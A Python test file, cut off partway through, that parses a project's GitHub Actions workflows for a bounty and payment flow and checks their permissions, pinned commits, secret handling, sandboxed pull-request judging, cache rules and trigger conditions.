"""The second deployment's workflows: what a repository installs (examples/), what those files call (fund.yml,
prove.yml and check.yml, published from drexthealpha/knos-workflows) and what Knos runs on itself. Every rule the
design rests on is checked on the parsed files. Nothing here talks to GitHub: a job's `if:` is run against sample
events by tests/_ghexpr.py, which follows GitHub's own rules for expressions."""
from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from _ghexpr import runs, value

ROOT = Path(__file__).resolve().parents[1]
WF = ROOT / ".github" / "workflows"
EXAMPLES = ROOT / "examples"
CLAIM_COPY = ROOT / "src" / "knos" / "settle" / "knos-claim.yml"
REUSABLE = ("fund.yml", "prove.yml", "check.yml")
CALLED = "drexthealpha/knos-workflows/.github/workflows/"
ROTATE = "drexthealpha/knos-oidc-rotate/.github/workflows/"
PLACEHOLDER = "KNOS_WORKFLOWS_SHA"                 # stands for the published commit until a release names it
OWN = {"knos-workflow.yml": "knos.yml", "knos-check.yml": "knos-check.yml"}       # an example, and Knos's own copy of it
SHA = r"[0-9a-f]{40}"

EVENT = '--event "$GITHUB_EVENT_PATH" --repo "$GITHUB_REPOSITORY"'
INSTALL = 'uv tool install --no-config "knos=={release}"'
JUDGE_INSTALL = 'uv tool install --no-config --with pytest --with pip "knos=={release}"'
COMMAND = {      # each job is the install and one command
    ("fund.yml", "command"): f"knos command {EVENT}",
    ("prove.yml", "settle"): f"knos settle {EVENT}",
    ("prove.yml", "review"): f"knos review {EVENT}",
    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox require',
    ("prove.yml", "attest"): f'knos settle --tests --pull "$PULL" --head "$HEAD" --issue "$ISSUE" {EVENT}',
    ("check.yml", "claims"): f"knos check {EVENT}",
}
WRITES = {"contents": "read", "issues": "write", "pull-requests": "write", "checks": "read", "statuses": "read", "actions": "read"}
MINTS = {**WRITES, "id-token": "write"}
READS = {"contents": "read", "pull-requests": "read", "issues": "read", "checks": "read", "statuses": "read", "actions": "read"}
PERMISSIONS = {      # exactly what each job's command needs, and nothing else
    ("fund.yml", "command"): MINTS, ("prove.yml", "settle"): MINTS, ("prove.yml", "review"): WRITES,
    ("prove.yml", "judge"): {"contents": "read"}, ("prove.yml", "attest"): MINTS, ("check.yml", "claims"): READS,
}
SETUP_UV = {"version": "0.8.20", "python-version": "3.12", "enable-cache": False, "ignore-empty-workdir": True}


def _doc(path: Path) -> dict:
    yaml = pytest.importorskip("yaml")
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    doc["on"] = doc.pop(True, doc.get("on"))   # YAML 1.1 reads the key `on` as True
    return doc


def _jobs(name: str) -> dict:
    return _doc(WF / name)["jobs"]


def _steps(job: dict, action: str = "") -> list[dict]:
    return [s for s in job.get("steps", []) if str(s.get("uses", "")).startswith(action)] if action else job.get("steps", [])


def _scripts(job: dict) -> list[str]:
    return [s["run"] for s in _steps(job) if "run" in s]


def _comments(path: Path) -> str:
    """What a file's comments say, as running text."""
    lines = (ln.split("#", 1)[1].strip() for ln in path.read_text(encoding="utf-8").splitlines() if ln.lstrip().startswith("#"))
    return " ".join(" ".join(lines).split())


def _files() -> list[Path]:
    """Every workflow file: Knos's own, the examples, and the copy `knos claim` installs."""
    return sorted(WF.glob("*.yml")) + sorted(EXAMPLES.glob("*.yml")) + [CLAIM_COPY]


def _mine() -> list[Path]:
    """The workflows of the payment flow (the others are the repository's own CI and its relay, checked elsewhere)."""
    return [WF / n for n in (*REUSABLE, *OWN.values(), "keys.yml")] + sorted(EXAMPLES.glob("*.yml")) + [CLAIM_COPY]


def _release() -> str:
    named = set(re.findall(r'"knos==(\d+\.\d+\.\d+)"', "".join((WF / n).read_text(encoding="utf-8") for n in REUSABLE)))
    assert len(named) == 1, f"the install lines name more than one release: {named}"
    return named.pop()


def _script(name: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ---- the files: no pull_request_target, one text per file, every action a pinned commit ------------------------------

def test_every_workflow_parses_and_none_is_started_by_pull_request_target():
    """GitHub blocks that trigger on public repositories by default from 2 Nov 2026. Nothing of Knos's uses it: not
    as a trigger, not in a condition, not in the action a repository can call from its own workflow."""
    for path in [*_files(), ROOT / "action.yml"]:
        doc = _doc(path)
        assert "pull_request_target" not in json.dumps(doc), path.name      # comments may say it is not used
        if path.name != "action.yml":
            assert doc["on"] and doc["jobs"], path.name


def test_what_a_repository_installs_is_what_knos_runs_on_itself():
    for example, own in OWN.items():        # the same workflow (the files are copies; only comments could differ)
        assert _doc(EXAMPLES / example) == _doc(WF / own), f"{own} is not examples/{example}"
    # the claim workflow `knos claim` puts into <you>/knos-claim is the example, and the site serves the same file
    assert CLAIM_COPY.read_bytes() == (EXAMPLES / "knos-claim.yml").read_bytes()
    assert 'cp examples/knos-claim.yml "$out/knos-claim.yml"' in (ROOT / "scripts" / "build_site.sh").read_text(encoding="utf-8")
    # one payment file and one optional check: nothing else to install, and nothing still calls the first deployment's relay
    assert sorted(p.name for p in EXAMPLES.glob("*.yml")) == ["knos-check.yml", "knos-claim.yml", "knos-workflow.yml"]
    assert not (WF / "relay.yml").exists() and not any("relay.yml" in p.read_text(encoding="utf-8") for p in _mine())
    assert _script("pinned_workflows").inconsistencies() == []


def test_every_action_is_a_commit_listed_in_action_pins_and_every_called_workflow_is_a_pinned_one():
    """A tag can be moved to other code; a commit cannot. Third-party actions are the commits scripts/action_pins.json
    lists for their tags. The workflows Knos calls are named by commit too: its own published ones (one commit for
    all three, or the placeholder until the release) and the two the programs pin."""
    pins = json.loads((ROOT / "scripts" / "action_pins.json").read_text(encoding="utf-8"))["pins"]
    ids = json.loads((ROOT / "programs-v2" / "program_ids.json").read_text(encoding="utf-8"))
    called = set()
    for path in _files():
        for name, ref, tag in re.findall(r"^\s*(?:- )?uses:\s*(\S+?)@(\S+)(?:\s+#\s*(\S+))?", path.read_text(encoding="utf-8"), re.M):
            if name.startswith(CALLED):
                assert name[len(CALLED):] in REUSABLE and (ref == PLACEHOLDER or re.fullmatch(SHA, ref)), (path.name, name, ref)
                called.add(ref)
            elif name.startswith(ROTATE):
                assert ref == {"rotate.yml": ids["rotate_sha"], "claim.yml": ids["claim_sha"]}[name[len(ROTATE):]], (path.name, name)
            else:
                assert re.fullmatch(SHA, ref) and pins.get(f"{name}@{tag}") == ref, f"{path.name}: {name}@{ref} # {tag}"
        local = re.findall(r"^\s*uses:\s*(\./\S+)", path.read_text(encoding="utf-8"), re.M)
        assert all((ROOT / ref).is_file() for ref in local), (path.name, local)
    # fund.yml and prove.yml must be one commit: a bounty is paid only by the prove.yml of the commit its fund.yml ran at
    assert len(called) == 1, f"the published workflows are named at more than one commit: {called}"


# ---- permissions ------------------------------------------------------------------------------------------------------

def test_permissions_start_empty_and_each_job_gets_the_least():
    for path in _mine():
        doc = _doc(path)
        assert doc["permissions"] == {}, f"{path.name}: the workflow grants nothing; each job asks for its own"
        assert all("permissions" in job for job in doc["jobs"].values()), path.name
    for (name, job), want in PERMISSIONS.items():
        assert _jobs(name)[job]["permissions"] == want, (name, job)
    assert sorted(PERMISSIONS) == sorted((name, job) for name in REUSABLE for job in _jobs(name))
    # A called workflow gets at most what the calling job grants, and GitHub refuses to start a run in which a called
    # job asks for more. So a calling job grants exactly what the jobs it calls need between them, and nothing else:
    # the review's calling job carries the id-token because the last job of a review (attest) signs.
    for example in OWN:
        for name, job in _doc(EXAMPLES / example)["jobs"].items():
            called = _jobs(job["uses"][len(CALLED):].split("@")[0])
            union: dict = {}
            for c in called.values():
                for scope, level in c["permissions"].items():
                    union[scope] = "write" if "write" in (level, union.get(scope)) else level
            assert job["permissions"] == union, (example, name)
    [keys] = _jobs("keys.yml").values()
    assert keys["permissions"] == {"id-token": "write", "issues": "write"}
    # nothing of Knos's can write to a repository's code, releases or settings
    for path in _mine():
        for name, job in _doc(path)["jobs"].items():
            assert not {"contents", "packages", "deployments", "pages", "security-events", "actions"} & {
                s for s, lv in job["permissions"].items() if lv == "write"}, (path.name, name)


def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_check_nothing_out():
    minting = {(path.name, name) for path in _mine() for name, job in _doc(path)["jobs"].items()
               if job["permissions"].get("id-token") == "write"}
    assert minting == {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), ("keys.yml", "keys"),
                       *((f, j) for f in ("knos.yml", "knos-workflow.yml") for j in ("command", "settle", "review")),
                       ("knos-claim.yml", "claim")}, minting
    assert not [job for job in _jobs("check.yml").values() if "id-token" in job["permissions"]]
    assert "id-token" not in _jobs("prove.yml")["judge"]["permissions"] and "id-token" not in _jobs("prove.yml")["review"]["permissions"]
    release = _release()
    for name, job in (("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest")):
        steps = _steps(_jobs(name)[job])
        # uv, the install, the command: no checkout, no git, no artifact, nothing a pull request wrote
        assert [s["uses"].split("@")[0] for s in steps if "uses" in s] == ["astral-sh/setup-uv"], (name, job)
        assert _scripts(_jobs(name)[job]) == [INSTALL.format(release=release), COMMAND[name, job]], (name, job)
    # in a calling file such a job is a call to a pinned workflow and nothing else
    for path in _mine():
        for name, job in _doc(path)["jobs"].items():
            if (path.name, name) in minting and path.name not in REUSABLE:
                assert "steps" not in job and job["uses"].startswith((CALLED, ROTATE)), (path.name, name)


def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_nothing_on():
    jobs = _jobs("prove.yml")
    judge = jobs["judge"]
    assert judge["permissions"] == {"contents": "read"}
    assert "secrets." not in json.dumps(judge) and "outputs" not in judge and judge["cache-mode"] == "read"
    assert judge["needs"] == "review" and judge["if"] == "needs.review.outputs.tests != ''"
    # The default branch as this run saw it, with its history and no token left in it. The pinned actions/checkout
    # refuses a fork's pull request in a `workflow_run` run; it is not asked to check one out, here or anywhere.
    [base] = _steps(judge, "actions/checkout@")
    assert base["with"] == {"ref": "${{ github.sha }}", "path": "base", "fetch-depth": 0, "persist-credentials": False}
    assert "allow-unsafe-pr-checkout" not in "".join(p.read_text(encoding="utf-8") for p in _mine())
    fetch, install, command = [s for s in _steps(judge) if "run" in s]
    assert [install["run"], command["run"]] == [JUDGE_INSTALL.format(release=_release()), COMMAND["prove.yml", "judge"]]
    # the pull request's head: the commit the review named, fetched as that pull request's head and unpacked as plain
    # files; what it changed is read from git between the two commits that were checked out, never asked of GitHub later
    assert fetch["env"] == {"PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
                            "GH_TOKEN": "${{ github.token }}"}
    script = fetch["run"]
    assert script.startswith("set -euo pipefail\n") and "${{" not in script
    for line in ("""case "$PULL" in ''|*[!0-9]*)""", """case "$HEAD" in ''|*[!0-9a-f]*)""",
                 'git -C base fetch -q --no-tags origin "+refs/pull/$PULL/head:refs/knos/head"',
                 'if [ "$(git -C base rev-parse refs/knos/head)" != "$HEAD" ]; then',
                 'GIT_LFS_SKIP_SMUDGE=1 git -C base archive "$HEAD" | tar -x -C pr',
                 'git -C base diff --no-renames --name-only "$GITHUB_SHA...$HEAD" > changed.txt'):
        assert line in script, line
    assert script.index("case \"$HEAD\"") < script.index("git -C base fetch") < script.index("rev-parse") < script.index("archive")
    # the token goes with that one fetch through git's environment: not on a command line, not into the clone
    assert "GIT_CONFIG_VALUE_$n=AUTHORIZATION: basic $basic" in script and "git config" not in script and "$GH_TOKEN@" not in script
    # the step that runs the pull request's code has no token, and runs it only in the sandbox
    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox require")
    assert [s for s in _steps(judge) if "GH_TOKEN" in (s.get("env") or {})] == [fetch]
    # It is the only job that has anything of a pull request on disk: no other job checks anything out or uses git.
    for name in REUSABLE:
        for job_name, job in _jobs(name).items():
            if (name, job_name) != ("prove.yml", "judge"):
                assert not _steps(job, "actions/checkout@"), (name, job_name)
                assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job))), (name, job_name)
    # The job that mints takes one fact from it: that it succeeded. Which pull request, which head commit and which
    # issue come from review, a job that ran no pull request code: the same three values the judge was given.
    attest = jobs["attest"]
    assert attest["needs"] == ["review", "judge"]
    assert attest["if"] == "needs.review.outputs.tests != '' && needs.judge.result == 'success'"
    assert re.findall(r"needs\.judge\.[\w.]+", json.dumps(attest)) == ["needs.judge.result"]
    [settle] = [s for s in _steps(attest) if s.get("run") == COMMAND["prove.yml", "attest"]]
    assert settle["env"] == {"GH_TOKEN": "${{ github.token }}", "KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}",
                             "PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
                             "ISSUE": "${{ needs.review.outputs.tests }}"}
    assert settle["env"]["ISSUE"] == command["env"]["ISSUE"] and {settle["env"]["PULL"], settle["env"]["HEAD"]} == {fetch["env"]["PULL"], fetch["env"]["HEAD"]}
    review = jobs["review"]
    assert review["outputs"] == {k: f"${{{{ steps.review.outputs.{k} }}}}" for k in ("tests", "pull", "head")}
    assert [s.get("id") for s in _steps(review) if s.get("run") == COMMAND["prove.yml", "review"]] == ["review"]
    assert "secrets." not in json.dumps(review) and "id-token" not in review["permissions"]
    # with the judge refused or failed, nothing mints
    ctx = {"needs": {"review": {"result": "success", "outputs": {"tests": "7"}}, "judge": {"result": "success"}}}
    assert runs(attest["if"], ctx, {"review": "success", "judge": "success"})
    for results in ({"review": "success", "judge": "failure"}, {"review": "success", "judge": "skipped"},
                    {"review": "success", "judge": "cancelled"}, {"review": "failure", "judge": "success"}):
        got = {"needs": {"review": {"result": results["review"], "outputs": {"tests": "7"}}, "judge": {"result": results["judge"]}}}
        assert not runs(attest["if"], got, results), results
    assert not runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {"tests": ""}}}}, {"review": "success"})
    assert not runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {}}}}, {"review": "success"})
    assert not runs(judge["if"], {"needs": {"review": {"result": "failure", "outputs": {"tests": "7"}}}}, {"review": "failure"})
    assert runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {"tests": "7"}}}}, {"review": "success"})


# ---- what people write never reaches a shell --------------------------------------------------------------------------

def test_untrusted_text_reaches_a_shell_only_through_the_event_file_or_env():
    """A comment, a title, a description and a branch name are data. No script has an expression spliced into it, and
    the commands read the event from the file GitHub wrote."""
    release = _release()
    # what an action or a called workflow is handed from an event or another job: the address for the claim workflow,
    # the one the owner types into "Run workflow" (it takes it as an input, into its own env), and nothing else
    handed = {"${{ inputs.address }}"}
    written_by_others = re.compile(r"github\.event\.|github\.head_ref|github\.ref_name|\binputs\.|\bneeds\.|\bsteps\.")
    for path in _mine():
        for job_name, job in _doc(path)["jobs"].items():
            for s in _steps(job):
                assert "${{" not in str(s.get("run", "")), f"{path.name} {job_name}: an expression inside a script"
                for v in (s.get("with") or {}).values():
                    assert not written_by_others.search(str(v)), (path.name, job_name, v)
                for k, v in (s.get("env") or {}).items():       # env is where such a value belongs; none needs the event itself
                    assert "github.event." not in str(v) and "github.head_ref" not in str(v), (path.name, job_name, k)
            for v in (job.get("with") or {}).values():
                assert not written_by_others.search(str(v)) or v in handed, (path.name, job_name, v)
    for (name, job), command in COMMAND.items():
        install = (JUDGE_INSTALL if job == "judge" else INSTALL).format(release=release)
        assert _scripts(_jobs(name)[job])[-2:] == [install, command], (name, job)       # install, one command: no logic in YAML
        assert len(_scripts(_jobs(name)[job])) == (3 if job == "judge" else 2), (name, job)
    for name in ("knos command", "knos review", "knos check"):
        assert all(c == f"{name} {EVENT}" for c in COMMAND.values() if c.startswith(name + " "))
    assert all(c.endswith(EVENT) for c in COMMAND.values() if c.startswith("knos settle "))


# ---- the one optional secret, and no inputs ---------------------------------------------------------------------------

def test_the_only_secret_is_the_optional_relay_key_and_only_a_step_that_can_mint_gets_it():
    for name in ("fund.yml", "prove.yml"):
        call = _doc(WF / name)["on"]["workflow_call"]
        assert set(call["secrets"]) == {"KNOS_RELAY_KEY"} and call["secrets"]["KNOS_RELAY_KEY"]["required"] is False
        assert call["secrets"]["KNOS_RELAY_KEY"]["description"]
    assert not (_doc(WF / "check.yml")["on"]["workflow_call"] or {})           # the check takes nothing at all
    given = set()
    for name in REUSABLE:
        text = (WF / name).read_text(encoding="utf-8")
        assert set(re.findall(r"secrets\.(\w+)", "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#")))) <= {"KNOS_RELAY_KEY"}
        for job_name, job in _jobs(name).items():
            assert "secrets." not in json.dumps({k: v for k, v in job.items() if k != "steps"}), (name, job_name)
            for s in _steps(job):
                if "secrets." in json.dumps(s):
                    assert s["env"]["KNOS_RELAY_KEY"] == "${{ secrets.KNOS_RELAY_KEY }}" and s["run"].startswith(("knos command ", "knos settle "))
                    given.add((name, job_name))
    assert given == {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest")}
    # A repository needs no secret. Its file hands the one optional secret on by name (an unset secret passes nothing),
    # never all of them, and the check's file names none.
    for example in OWN:
        text = (EXAMPLES / example).read_text(encoding="utf-8")
        assert "inherit" not in json.dumps(_doc(EXAMPLES / example)["jobs"])
        for name, job in _doc(EXAMPLES / example)["jobs"].items():
            want = {"KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}"} if example == "knos-workflow.yml" else None
            assert job.get("secrets") == want, (example, name)
        assert set(re.findall(r"secrets\.(\w+)", text)) <= {"KNOS_RELAY_KEY"}
    assert "secrets" not in (EXAMPLES / "knos-claim.yml").read_text(encoding="utf-8").split("\nname:")[1]


def test_no_caller_can_change_which_code_judges():
    """A funder could otherwise pin the official commit and swap the judge. The called workflows take no inputs and
    read no repository variable; every job installs one exact release from PyPI, with the same pinned uv, ignoring the
    uv configuration of whatever is in the working directory, and with dependencies no newer than one cutoff."""
    release = _release()
    steps, cutoffs = [], set()
    for name in REUSABLE:
        doc = _doc(WF / name)
        assert set(doc["on"]) == {"workflow_call"} and "inputs" not in (doc["on"]["workflow_call"] or {}), name
        code = json.dumps(doc["jobs"])
        assert not re.search(r"\b(inputs|vars)\.", code) and "github.event.inputs" not in code, name
        assert "KNOS_RPC" not in code and "KNOS_RELAY_LOG_REPO" not in code, name      # the commands' own defaults, not a caller's
        for job_name, job in doc["jobs"].items():
            assert job["runs-on"] == "ubuntu-24.04" and "env" not in job and "container" not in job, (name, job_name)
            [uv] = _steps(job, "astral-sh/setup-uv@")
            [install] = [s for s in _steps(job) if str(s.get("run", "")).startswith("uv tool install ")]
            steps.append(uv["with"])
            assert install["run"] == (JUDGE_INSTALL if job_name == "judge" else INSTALL).format(release=release)
            assert set(install["env"]) == {"UV_EXCLUDE_NEWER"} and "--no-config" in install["run"]
            cutoffs.add(install["env"]["UV_EXCLUDE_NEWER"])
            assert _steps(job).index(install) == _steps(job).index(uv) + 1
            # the command comes last and nothing else is installed or run after the install
            assert [s.get("run", s.get("uses", "")).split("@")[0].split(" ")[0] for s in _steps(job)][-3:] == ["astral-sh/setup-uv", "uv", "knos"]
            assert not [s for s in _steps(job) if "pip install" in str(s.get("run", "")) or "setup-python" in str(s.get("uses", ""))]
    assert all(w == SETUP_UV for w in steps), "every job sets uv up the same way, with no cache"
    assert len(cutoffs) == 1
    # the one thing a called workflow hands back is whether a payment should be tried next: it decides no payment
    assert _doc(WF / "fund.yml")["on"]["workflow_call"]["outputs"]["settle"]["value"] == "${{ jobs.command.outputs.settle }}"
    assert _jobs("fund.yml")["command"]["outputs"] == {"settle": "${{ steps.command.outputs.settle }}"}
    assert [s.get("id") for s in _steps(_jobs("fund.yml")["command"]) if s.get("run") == COMMAND["fund.yml", "command"]] == ["command"]
    assert "outputs" not in _doc(WF / "prove.yml")["on"]["workflow_call"]
    for example in OWN:                       # and a repository's file passes them nothing but the optional secret
        assert all("with" not in job for job in _doc(EXAMPLES / example)["jobs"].values()), example


def test_the_release_the_workflows_install_is_this_one_and_its_cutoff_comes_after_it():
    try:
        import tomllib
    except ModuleNotFoundError:   # Python 3.10
        import tomli as tomllib  # type: ignore[no-redef]
    as_numbers = lambda v: tuple(int(x) for x in v.split("."))  # noqa: E731
    release = _release()
    version = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["project"]["version"]
    # The workflows are written for the release being built and pyproject.toml moves at the release itself: until
    # then they may be ahead of it. They may never install an older release than the package's.
    assert as_numbers(release) >= as_numbers(version), f"the workflows install knos {release}; pyproject.toml is at {version}"
    [cutoff] = set(re.findall(r'UV_EXCLUDE_NEWER: "([^"]+)"', "".join((WF / n).read_text(encoding="utf-8") for n in REUSABLE)))
    cutoff = datetime.strptime(cutoff, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
    newest, day = re.search(r"^## (\d+\.\d+\.\d+) \((\d{1,2} \w{3} \d{4})\)$", (ROOT / "CHANGELOG.md").read_text(encoding="utf-8"), re.M).groups()
    released = datetime.strptime(day, "%d %b %Y").replace(tzinfo=timezone.utc)
    # uv refuses every package published after the cutoff, knos itself included. So the cutoff must lie after the
    # day the newest release in CHANGELOG.md was published: move UV_EXCLUDE_NEWER in fund.yml, prove.yml and check.yml
    # to a day or two after the release, and publish the workflows again (scripts/pinned_workflows.py).
    assert cutoff >= released + timedelta(days=1), f"UV_EXCLUDE_NEWER {cutoff:%Y-%m-%d} would refuse knos {newest}, released {day}"


def test_no_job_of_the_payment_flow_restores_or_saves_a_cache():
    """A cache written by a run of pull request code could be read by a job that signs, so nothing in the three
    published workflows restores one, saves one or lets an action do either, and `cache-mode: read` is on every job."""
    for name in REUSABLE:
        for job_name, job in _jobs(name).items():
            assert job.get("cache-mode") == "read", (name, job_name)
            assert not _caches(job) and not [s for s in _steps(job) if "artifact" in str(s.get("uses", ""))], (name, job_name)


# The caches that may sit in a job which sees a secret: notes a script reads as data and never runs, written only by
# the workflow itself (on a schedule or by hand, never by a pull request's run). Anything that installs or builds in
# such a job has no cache at all.
DATA_CACHES = {("worker.yml", "relay"): {".knos-home"}, ("index.yml", "index"): {"~/.cache/knos-agent-pr-ci"}}


def _caches(job: dict) -> list[tuple[str, str]]:
    """Each step of a job that can restore or save an Actions cache: (action, what it caches). uv's cache is on unless
    `enable-cache` is false (its default is on for GitHub-hosted runners), and so is setup-node's when `packageManager`
    is named, unless `package-manager-cache` is false; any setup action with a `cache` input counts."""
    found = []
    for step in _steps(job):
        action, args = str(step.get("uses", "")).split("@")[0], step.get("with") or {}
        if action.startswith(("actions/cache", "Swatinem/rust-cache")):
            found.append((action, str(args.get("path", args.get("workspaces", "")))))
        elif action == "astral-sh/setup-uv" and args.get("enable-cache", "auto") is not False:
            found.append((action, "uv"))
        elif action == "actions/setup-node" and args.get("package-manager-cache") is not False:
            found.append((action, "npm"))
        elif args.get("cache"):
            found.append((action, str(args["cache"])))
    return found


def _sees_a_secret_or_signs(doc: dict, job: dict) -> bool:
    permissions = job.get("permissions", doc.get("permissions")) or {}
    return permissions.get("id-token") == "write" or "secrets." in json.dumps(job) or "secrets" in job


def test_no_job_that_signs_or_sees_a_secret_uses_a_cache():
    """Every job with `id-token: write` or any secret, in every workflow of the repository."""
    sensitive, cached = set(), set()
    for path in sorted(WF.glob("*.yml")):
        doc = _doc(path)
        for name, job in doc["jobs"].items():
            if _sees_a_secret_or_signs(doc, job):
                sensitive.add((path.name, name))
                if _caches(job):
                    cached.add((path.name, name))
                    # only the named data caches, and only through actions/cache: no installer, no build cache
                    assert (path.name, name) in DATA_CACHES, (path.name, name, _caches(job))
                    assert {a for a, _ in _caches(job)} <= {"actions/cache", "actions/cache/restore", "actions/cache/save"}, (path.name, name)
                    assert {p for _, p in _caches(job)} == DATA_CACHES[path.name, name], (path.name, name)
    assert cached == set(DATA_CACHES), "a data cache is listed that no job uses any more"
    # the test sees what it is meant to see: the jobs that sign, the jobs that hold a registry token, the relay
    assert {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), ("keys.yml", "keys"), ("worker.yml", "relay"),
            ("release.yml", "pypi"), ("release.yml", "crates"), ("release.yml", "npmjs"), ("network.yml", "deploy"),
            ("index.yml", "index")} <= sensitive, sorted(sensitive)
    # and it would catch the mistakes: uv's cache left at its default, a cache action, a rust cache, setup-node's automatic one
    for step in ({"uses": "astral-sh/setup-uv@x"}, {"uses": "astral-sh/setup-uv@x", "with": {"enable-cache": True}},
                 {"uses": "actions/cache@x", "with": {"path": "p"}}, {"uses": "Swatinem/rust-cache@x"},
                 {"uses": "actions/setup-node@x"}, {"uses": "actions/setup-python@x", "with": {"cache": "pip"}}):
        assert _caches({"steps": [step]}), step
    assert not _caches({"steps": [{"uses": "astral-sh/setup-uv@x", "with": {"enable-cache": False}},
                                  {"uses": "actions/setup-node@x", "with": {"package-manager-cache": False}}, {"run": "true"}]})


# ---- two runs for the same issue or pull request do not race ------------------------------------------------------------

def test_runs_for_one_issue_or_pull_request_wait_for_each_other_and_none_is_dropped():
    fund, prove, check = _jobs("fund.yml"), _jobs("prove.yml"), _jobs("check.yml")
    # commands on one issue or pull request run one at a time, each in its turn: every comment is answered
    assert fund["command"]["concurrency"] == {"group": "knos-command-${{ github.event.issue.number }}", "queue": "max"}
    # a push does not say which pull requests it merged: merges share one line, and no run is dropped. A comment, which
    # anyone can write, waits in its pull request's own line: comments cannot fill the line the merges wait in.
    line = prove["settle"]["concurrency"]
    assert line["queue"] == "max" and prove["attest"]["concurrency"] == {"group": "knos-settle", "queue": "max"}
    group = line["group"][3:-2].strip()
    assert value(group, _push()) == value(group, _event("workflow_dispatch", {"inputs": {"pull": "7"}})) == "knos-settle"
    assert value(group, _comment("/knos settle", pull=True)) == "knos-settle-7"
    who = "${{ github.event.workflow_run.head_repository.id }}-${{ github.event.workflow_run.head_branch }}"
    assert prove["review"]["concurrency"] == {"group": f"knos-review-{who}"}       # the newest waiting review replaces an older one
    assert prove["judge"]["concurrency"] == {"group": f"knos-judge-{who}"}
    assert check["claims"]["concurrency"] == {"group": "knos-check-${{ github.event.pull_request.number }}", "cancel-in-progress": True}
    groups = [job["concurrency"]["group"].split("$")[0] for jobs in (fund, prove, check) for job in jobs.values() if job is not prove["settle"]]
    assert all(g.startswith("knos-") for g in groups) and len(set(groups)) == 5
    for name in REUSABLE:
        assert "concurrency" not in _doc(WF / name)
        for job in _jobs(name).values():      # GitHub refuses `queue: max` together with cancel-in-progress
            assert not (job["concurrency"].get("queue") == "max" and job["concurrency"].get("cancel-in-progress"))
    # A calling file sets no group of its own: one that matched a called job's would make GitHub cancel the run.
    for example in OWN:
        doc = _doc(EXAMPLES / example)
        assert "concurrency" not in doc and all("concurrency" not in job for job in doc["jobs"].values()), example


# ---- which events start which job -------------------------------------------------------------------------------------

REPOSITORY = {"default_branch": "main", "name": "widgets", "description": "Widgets for everyone."}


def _event(name: str, event: dict, **over) -> dict:
    return {"github": {"event_name": name, "event": {"repository": REPOSITORY, **event}, "ref": "refs/heads/main", "actor": "mona",
                       "repository": "octo/widgets", "run_number": "7", **over}, "inputs": {}}


def _comment(body: str, pull: bool = False, action: str = "created") -> dict:
    issue = {"number": 7, **({"pull_request": {"url": "https://api.github.com/repos/o/r/pulls/7"}} if pull else {})}
    return _event("issue_comment", {"action": action, "comment": {"body": body}, "issue": issue})


def _issue(body: str | None, action: str = "opened") -> dict:
    return _event("issues", {"action": action, "issue": {"number": 9, "body": body}})


def _push(ref: str = "refs/heads/main", actor: str = "mona", default: str = "main") -> dict:
    return _event("push", {"ref": ref, "repository": {**REPOSITORY, "default_branch": default}}, ref=ref, actor=actor)


def _checked(conclusion: str = "success", event: str = "pull_request") -> dict:
    return _event("workflow_run", {"action": "completed", "workflow_run": {"event": event, "conclusion": conclusion, "head_sha": "a" * 40,
                                                                           "head_branch": "fix", "head_repository": {"id": 99}, "pull_requests": []}})


def _started(doc: dict, context: dict, said: dict | None = None, cancelled: bool = False) -> set[str]:
    """The jobs of a workflow that run for an event, in the order the file lists them (a job's needs come first).
    `said`: the outputs a job gives when it runs, by job."""
    ran, results, needs = set(), {}, {}
    for name, job in doc["jobs"].items():
        wanted = [job["needs"]] if isinstance(job.get("needs"), str) else list(job.get("needs", []))
        if runs(job.get("if"), {**context, "needs": {n: needs[n] for n in wanted}}, {n: results[n] for n in wanted}, cancelled):
            ran.add(name)
        results[name] = "success" if name in ran else "skipped"
        needs[name] = {"result": results[name], "outputs": (said or {}).get(name, {}) if name in ran else {}}
    return ran


SETTLE = {"command": {"settle": "7"}}       # what `knos command` writes when a payment should be tried next
SAMPLES = [   # (what happened, the event, what the command job said, the jobs of knos.yml that run)
    ("an ordinary comment", _comment("Looks good to me, thanks!"), None, set()),
    ("a comment that only mentions a command", _comment("You can type /knos take to reserve it."), None, set()),
    ("a quoted command", _comment("> /knos take\n\nWhat does this do?"), None, set()),
    ("a command", _comment("/knos take"), None, {"command"}),
    ("a command, capitalised by a phone", _comment("/Knos fund 20"), None, {"command"}),
    ("a command after a sentence and blank lines, as GitHub's editor sends them", _comment("I can do this.\r\n\r\n/knos take"), None, {"command"}),
    ("a command the judge will not know", _comment("/knos frobnicate"), None, {"command"}),
    ("settle, on a pull request", _comment("/knos settle", pull=True), SETTLE, {"command", "settle"}),
    ("settle, typed with two spaces", _comment("/knos  settle", pull=True), SETTLE, {"command", "settle"}),
    ("a tip that was funded", _comment("/KNOS tip 5", pull=True), SETTLE, {"command", "settle"}),
    ("a tip from someone who may not tip: the command answers, and nothing is settled", _comment("/knos tip 5", pull=True), None, {"command"}),
